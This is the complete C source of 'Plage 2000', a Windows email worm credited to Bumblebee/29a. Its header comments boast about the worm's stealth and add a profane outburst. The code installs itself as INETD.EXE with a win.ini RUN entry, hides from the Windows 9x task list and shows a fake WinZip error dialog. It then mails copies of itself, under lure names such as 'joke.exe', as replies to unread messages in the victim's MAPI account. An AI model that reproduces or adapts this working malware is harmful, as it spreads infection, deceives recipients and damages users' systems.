   /*

       Plage 2000
       Coded by Bumblebee/29a

       Another worm?
       -------------

       This is Plage 2000. You can see what is the real plage of 2000: just look the
       payload. If you feel offended by it then FUCK YOU! This is not intolerance or
       hate. Only one thing: i'm not agree with inhumanity.

       I know, i know. Anoher worm. But it's so nice! This is the first seriuos
       worm i code in C++ (oh, +- it's really C). It works similar to another well
       known worm: I-Worm.ZippedFiles. I haven't seen its source, but the AVP
       description makes me think so.

       Replies the unreaded mails found in the default account after log in. Marks
       the replied mail with two spaces at the end of the subject. Notice that the
       reply has this mark too. Due to this i avoid to re-send worm. Makes use of
       the different levels of priority during execution to enhance performance.
       Selects between 16 different names for the attachment, but the body of the
       message it's so static :(

       The worm does some stealth tickz:

               - Shows a WinZip Self-Extractor dialog after installation
               - Hides itself from task list with documented method (win9x only)

       I tried to do it harder to remove for the user than most worms (win9x).


                                                               The way of the bee
   */
   #include<windows.h>
   #include<mapi.h>
   #include<memory.h>

   #include"res.rh"

   // API form MAPI32 use by the worm
   ULONG (PASCAL FAR *MSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
   ULONG (PASCAL FAR *MLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
   ULONG (PASCAL FAR *MFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
   ULONG (PASCAL FAR *MReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
   ULONG (PASCAL FAR *MSaveMail)(LHANDLE, ULONG, lpMapiMessage, FLAGS, ULONG, LPTSTR);
   ULONG (PASCAL FAR *MFreeBuffer)(LPVOID);
   // for task list stealth under win9x
   ULONG (PASCAL FAR *RegisterServiceProcess)(ULONG, ULONG);

   void SendMail(LHANDLE session, char *subject, char *sfrom, char *sto, char *smes);
   BOOL CALLBACK MDialogProc(HWND, UINT, WPARAM, LPARAM);
   BOOL CALLBACK MDialogProcPay(HWND, UINT, WPARAM, LPARAM);
   BOOL CALLBACK MDialogProcPayPaint(HWND, UINT, WPARAM, LPARAM);
   int PASCAL WinMain(HINSTANCE, HINSTANCE, LPSTR, int);


   void fake() { fake(); } // fake function
   HBITMAP bmp;               // for the payload
   char fileName[512];


   #pragma argsused
   // main
   int PASCAL
   WinMain(HINSTANCE hInstance,
               HINSTANCE hPrevInstance,
               LPSTR lpCmdLine,
               int nCmdShow)
   {
     SYSTEMTIME syst;    // for payload
     char buffer[512];   // erm...
     HINSTANCE MAPIlHnd; // to manage MAPI32.DLL
     LHANDLE session;    // to manage the session login
     char messId[512];   // to store messages identifiers
     MapiMessage *mess;  // to store the mails we read
     char subject[1024],
          address[1024],
             body[8192],
           server[1024]; // to manage... guess!
     long i,j;           // to do some loops
     char *tmp;          // neded at sending mail time
     MSG msg;            // to process messages


     fileName[0]=0;
     // get module name for the attachment, the stealth and residence
     if(!GetModuleFileName(hInstance,fileName,512)) {
        DialogBox(hInstance,"UNZIP",(HWND)NULL,(DLGPROC)MDialogProc);
        return -1;
     }

     GetWindowsDirectory((char *)buffer,128);
     wsprintf(buffer,"%s\\INETD.EXE",buffer);
     i=strcmpi(lpCmdLine,"Install me!");
       if(strcmpi(fileName,buffer) || !i) {
           // install into system
           CopyFile(fileName,buffer,1);
           WriteProfileString("WINDOWS", "RUN", buffer);
           WriteProfileString(NULL, NULL, NULL);
           // do stealth (if not forced installation)
           if(i)
               DialogBox(hInstance,"UNZIP",(HWND)NULL,(DLGPROC)MDialogProc);
           return -1;
       }

     // at this point the worm know it's installed yet
     // avoid multiple instances of worm running at the same time
     // (this works under NT or hPrevInstance is ever NULL?)
     if(hPrevInstance)
       return 0;

     // try to hide the process in the task list
     // this will work only in win9x 'cause NT doesn't exports
     // 'RegisterServiceProcess' API
     HMODULE k32=GetModuleHandle("KERNEL32.DLL");
     if(k32) {
         (FARPROC &)RegisterServiceProcess=GetProcAddress(k32,"RegisterServiceProcess");
         if(RegisterServiceProcess)
           RegisterServiceProcess(NULL,1);
     }

     // check date
     GetSystemTime(&syst);
     if(syst.wDayOfWeek==3 && syst.wHour<2) {
           // get the bitmap from resource
           bmp=LoadBitmap(hInstance,"FOLLOW");
           // show the payload dialog
           DialogBox(hInstance,"PLAGE",(HWND)NULL,(DLGPROC)MDialogProcPay);
           DeleteObject(bmp);
           // continue execution: User should try to remove the worm:
           // make it harder... from Winblows only can erase win.ini line
           // while the worm is running (cannot stop it if task list stealth
           // works). The worm restores this line when user closes the system
           // juajua.
     }

     // sleep five minutes before act
     Sleep(60000*5);

     // load MAIP32.DLL
     MAPIlHnd=LoadLibrary("MAPI32.DLL"); // try to load MAPI32.DLL
     if(!MAPIlHnd)
        return -1;

     // get MAPILogon
     (FARPROC &)MLogon=GetProcAddress(MAPIlHnd, "MAPILogon");
     if(!MLogon)
        return -1;

     // get MAPIFindNext
     (FARPROC &)MFindNext=GetProcAddress(MAPIlHnd, "MAPIFindNext");
     if(!MFindNext)
        return -1;

     // get MAPIReadMail
     (FARPROC &)MReadMail=GetProcAddress(MAPIlHnd, "MAPIReadMail");
     if(!MReadMail)
        return -1;

     // get MAPIFreeBuffer
     (FARPROC &)MFreeBuffer=GetProcAddress(MAPIlHnd, "MAPIFreeBuffer");
     if(!MFreeBuffer)
        return -1;

     // get MAPISendMail
     (FARPROC &)MSendMail=GetProcAddress(MAPIlHnd, "MAPISendMail");
     if(!MSendMail)
        return -1;

     // get MAPISaveMail
     (FARPROC &)MSaveMail=GetProcAddress(MAPIlHnd, "MAPISaveMail");
     if(!MSaveMail)
        return -1;

     // 1st logon the default account
     if(MLogon(NULL,NULL,NULL,MAPI_USE_DEFAULT,
           NULL,&session)!=SUCCESS_SUCCESS)
        return -1;

     // 2nd find unread messages identifiers
     // this is the infinite loop of the worm (while message!=WM_QUIT)
     // run with lowest priority while not messages into inbox
     SetThreadPriority(NULL,THREAD_PRIORITY_LOWEST);
     while(GetMessage(&msg,NULL,0,0))
     if(MFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID|MAPI_UNREAD_ONLY
               ,NULL,messId)==SUCCESS_SUCCESS) {
           do {
                   // 3rd read minium of message and test checked mark
                   if(MReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,
                       NULL,&mess)==SUCCESS_SUCCESS) {
                       // we want a subject of at least 2 chars
                       if(lstrlen(mess->lpszSubject)>2)
                       // test the checked mark
                       if(mess->lpszSubject[strlen(mess->lpszSubject)-1]!=' ' &&
                           mess->lpszSubject[strlen(mess->lpszSubject)-2]!=' ') {
                           MFreeBuffer(mess);
                           // Do it fast!
                           SetThreadPriority(NULL,THREAD_PRIORITY_HIGHEST);
                       // read all the message and process it
                       if(MReadMail(session,NULL,messId,MAPI_SUPPRESS_ATTACH|MAPI_PEEK,
                           NULL,&mess)==SUCCESS_SUCCESS) {
                           body[0]=0;
                           if(mess->lpszNoteText) {
                               wsprintf(body,"'%s' wrote:\n====\n- ",mess->lpOriginator->lpszName);
                               for(i=0,j=lstrlen(body);i<lstrlen(mess->lpszNoteText) && j<512;i++,j++) {
                                   body[j]=mess->lpszNoteText[i];
                                   if(body[j]=='\n') {
                                       body[j]=0;
                                       lstrcat(body,"\n- ");
                                       j+=2;
                                   }
                               }
                               body[j]=0;
                           }
                           for(i=0;i<lstrlen(address) && address[i]!='@';i++);
                           if(i<lstrlen(address))
                               wsprintf(server,"%s account",address+i+1);
                           else
                               wsprintf(server,"P2000 Mail");
                           if(j>=512)
                               lstrcat(body," ...'");
                           else
                               lstrcat(body," ");
                           wsprintf(body+strlen(body),"\n====\n\n %s auto-reply:\n\n",server);
                           lstrcat(body,"  \' I'll try to reply as soon as possible.\n"
                           "  Take a look to the attachment and send me your opinion! \'\n\n\n");
                           wsprintf(body+strlen(body),"\t> Get your FREE %s now! <\n\n",server);
                           // it's important the reply has the checked mark!
                           wsprintf(subject,"Re: %s  ",mess->lpszSubject);
                           wsprintf(address,"%s",mess->lpOriginator->lpszAddress);
                           // send a mail ;)
                           SendMail(session, subject, NULL, address, body);
                           // set our 'checked' mark
                           tmp=(char *)malloc(strlen(mess->lpszSubject)+3);
                           strcpy(tmp,mess->lpszSubject);
                           free(mess->lpszSubject);
                           tmp[strlen(tmp)+2]=0;
                           tmp[strlen(tmp)]=' ';
                           tmp[strlen(tmp)-1]=' ';
                           mess->lpszSubject=tmp;
                           MSaveMail(session, NULL, mess, MAPI_LONG_MSGID, NULL, messId);
                           MFreeBuffer(mess);
                           // return to lowest priority
                           SetThreadPriority(NULL,THREAD_PRIORITY_LOWEST);
                       }
                       } else
                           MFreeBuffer(mess);
                   }

           } while(MFindNext(session,0,NULL,messId,MAPI_LONG_MSGID |
               MAPI_UNREAD_ONLY,NULL,messId)==SUCCESS_SUCCESS);
     }
     // free MAPI32.DLL
     FreeLibrary(MAPIlHnd);

     // before ends the worm check the win.ini line it's still there ;)
     WriteProfileString("WINDOWS", "RUN", buffer);
     WriteProfileString(NULL, NULL, NULL);
     return 0;
   }

   // improved from gift family
   void
   SendMail(LHANDLE session, char *subject, char *sfrom,char *sto, char *smes)
   {
    char *attachment[]={
    "pics.exe",
    "images.exe",
    "joke.exe",
    "PsPGame.exe",
    "news_doc.exe",
    "hamster.exe",
    "tamagotxi.exe",
    "searchURL.exe",
    "SETUP.EXE",
    "Card.EXE",
    "billgt.exe",
    "midsong.exe",
    "s3msong.exe",
    "docs.exe",
    "humor.exe",
    "fun.exe"
    };
    MapiMessage mes;
    MapiRecipDesc from;

       memset(&mes, 0, sizeof(MapiMessage));
       memset(&from, 0, sizeof(MapiRecipDesc));

       from.lpszName=sfrom; // From
       from.ulRecipClass=MAPI_ORIG;
       mes.lpszSubject=subject; // Subject
       mes.lpRecips=(MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
       if(!mes.lpRecips)
           return;
       memset(mes.lpRecips, 0, sizeof(MapiRecipDesc));
       mes.lpRecips->lpszName=sto; // Send to
       mes.lpRecips->ulRecipClass=MAPI_TO;
       mes.nRecipCount=1;

       mes.lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
       if(!mes.lpFiles)
           return;
       memset(mes.lpFiles, 0, sizeof(MapiFileDesc));
       mes.lpFiles->lpszPathName=fileName;
       mes.lpFiles->lpszFileName=attachment[GetTickCount()&15];
       mes.nFileCount=1;

       mes.lpOriginator=&from;

       mes.lpszNoteText=smes;          // Message
       MSendMail(session, NULL, &mes, NULL, NULL);

       free(mes.lpRecips);
       free(mes.lpFiles);
   }

   #pragma argsused
   // this is my stealth UNZIP dialog procedure
   BOOL CALLBACK
   MDialogProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
   {
    char tmp[1024];
    int i;

    switch(msg) {
       default:
       break;

       // setup the dialog for a full stealth ;)
       case WM_INITDIALOG:
               if(strlen(fileName)>0)
                   for(i=strlen(fileName);i>0 && fileName[i]!='\\';i--);
               else
                   strcpy(fileName,"Sel-Extractor");
               wsprintf(tmp,"To unzip all files in %s to the specified "
               "folder press the Unzip button.",fileName+i+1);
               SetDlgItemText(hwnd,TMESS,tmp);
               wsprintf(tmp,"WinZip self-Extractor - %s",fileName+i+1);
               SetWindowText(hwnd,tmp);
               CheckDlgButton(hwnd,IDCHECK,1);
       return TRUE;

       case WM_COMMAND:
               switch(wparam) {
                   // if one of this... make stealth
                   case IDUNZIP:
                   case IDWINZIP:
                       wsprintf(tmp,"ZIP damaged: file %s: Bad CRC number.\nPossible cause:"
                           " file transfer error.",fileName);
                       MessageBox(hwnd,tmp,"WinZip Self-Extractor",MB_ICONSTOP|MB_OK);
                       EndDialog(hwnd,0);
                   return TRUE;
                   // this stealth is different...
                   case IDABOUT:
                   case IDHELP:
                   case IDBROWSE:
                       // this fake func will end the app with a stack fault
                       fake();
                   break;
                   // if close... end the app
                   case IDCLOSE:
                       EndDialog(hwnd,0);
                   return TRUE;

                   default:
                   return FALSE;
               }
       break;
    }
    return FALSE;
   }

   #pragma argsused
   // this is my payload PLAGE dialog procedure
   BOOL CALLBACK
   MDialogProcPay(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
   {
   HWND dlgItemHnd;

    switch(msg) {
       default:
       break;

       case WM_INITDIALOG:
               SetDlgItemText(hwnd,TEXTMSG,
               "\nFight against the plage of inhumanity.\n"
               "This is Plage 2000 coded by Bumblebee/29a.");
               SetWindowText(hwnd,"Plage 2000 Activation");
               dlgItemHnd=GetDlgItem(hwnd,PHOTO);
               SetWindowLong(dlgItemHnd,GWL_WNDPROC,(LONG)MDialogProcPayPaint);
       return TRUE;

       case WM_COMMAND:
               switch(wparam) {
                   case IDOK:
                       EndDialog(hwnd,0);
                   return TRUE;

                   default:
                   break;
               }
       break;
    }
    return FALSE;
   }

   #pragma argsused
   // this is my payload PLAGE dialog procedure to paint the picture
   BOOL CALLBACK
   MDialogProcPayPaint(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
   {
    HDC dc,dcMEM;
    RECT rc;
    POINT end;

    switch(msg) {
       default:
       break;

       case WM_PAINT:
               dc=GetDC(hwnd);
               dcMEM=CreateCompatibleDC(dc);
               SetMapMode(dcMEM,GetMapMode(dc));
               SelectObject(dcMEM,bmp);
               GetWindowRect(hwnd,&rc);
               end.x=225;  // size of the image
               end.y=296;
               DPtoLP(dcMEM,&end,1);
               StretchBlt(dc,0,0,rc.right-rc.left,rc.bottom-rc.top,
                             dcMEM,0,0,end.x,end.y,SRCCOPY);
               DeleteDC(dcMEM);
       return TRUE;

    }
    return FALSE;
   }
